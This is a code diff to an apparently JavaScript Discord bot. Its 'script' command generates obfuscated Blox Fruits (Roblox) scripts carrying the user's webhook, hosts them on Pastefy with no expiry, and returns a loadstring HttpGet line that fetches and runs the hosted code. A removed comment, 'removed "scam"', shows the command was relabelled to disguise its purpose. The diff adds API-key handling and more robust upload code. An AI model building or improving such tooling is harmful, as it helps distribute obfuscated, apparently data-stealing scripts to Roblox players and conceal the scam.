@@ -28,7 +28,7 @@ client.once('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     const command = new SlashCommandBuilder()
         .setName('script')
-        .setDescription('Generate a Blox Fruits script with your webhook')   // removed "scam"
+        .setDescription('Generate a Blox Fruits script with your webhook')
         .addStringOption(option =>
             option.setName('game')
                 .setDescription('Game name (only "bloxfruits" for now)')
@@ -76,18 +76,46 @@ client.on('interactionCreate', async interaction => {
         // Obfuscate
         const obfuscated = obfuscateScript(template);
 
-        // Upload to Pastefy (never expires)
-        const pastefyRes = await axios.post('https://pastefy.app/api/v2/paste', {
-            content: obfuscated,
-            encryption: false,
-            expiration: 'never'
-        }, { timeout: 15000 });
-
-        if (!pastefyRes.data || !pastefyRes.data.id) {
-            throw new Error('Pastefy returned no ID');
+        // ----- Upload to Pastefy (with API key) -----
+        const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;
+        if (!PASTEFY_API_KEY) {
+            return interaction.editReply({ 
+                content: '❌ PASTEFY_API_KEY not set in environment variables. Please add it.' 
+            });
         }
 
-        const rawUrl = `https://pastefy.app/raw/${pastefyRes.data.id}`;
+        const pastefyRes = await axios.post(
+            'https://pastefy.app/api/v2/paste',
+            {
+                content: obfuscated,
+                encryption: false,
+                expiration: 'never'
+            },
+            {
+                timeout: 15000,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${PASTEFY_API_KEY}`
+                }
+            }
+        );
+
+        // Handle different possible response formats
+        let id = null;
+        if (pastefyRes.data && pastefyRes.data.id) {
+            id = pastefyRes.data.id;
+        } else if (pastefyRes.data && pastefyRes.data.paste && pastefyRes.data.paste.id) {
+            id = pastefyRes.data.paste.id;
+        } else if (pastefyRes.data && pastefyRes.data.success && pastefyRes.data.paste) {
+            id = pastefyRes.data.paste.id;
+        }
+
+        if (!id) {
+            console.error('Pastefy response:', JSON.stringify(pastefyRes.data, null, 2));
+            throw new Error('Pastefy returned no ID. Response: ' + JSON.stringify(pastefyRes.data));
+        }
+
+        const rawUrl = `https://pastefy.app/raw/${id}`;
         const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;
 
         const embed = new EmbedBuilder()
@@ -105,8 +133,8 @@ client.on('interactionCreate', async interaction => {
 
     } catch (error) {
         console.error(error);
-        await interaction.editReply({ 
-            content: '❌ Failed to upload script to Pastefy. Please try again later.\n' + error.message 
+        await interaction.editReply({
+            content: '❌ Failed to generate script: ' + error.message
         });
     }
 });
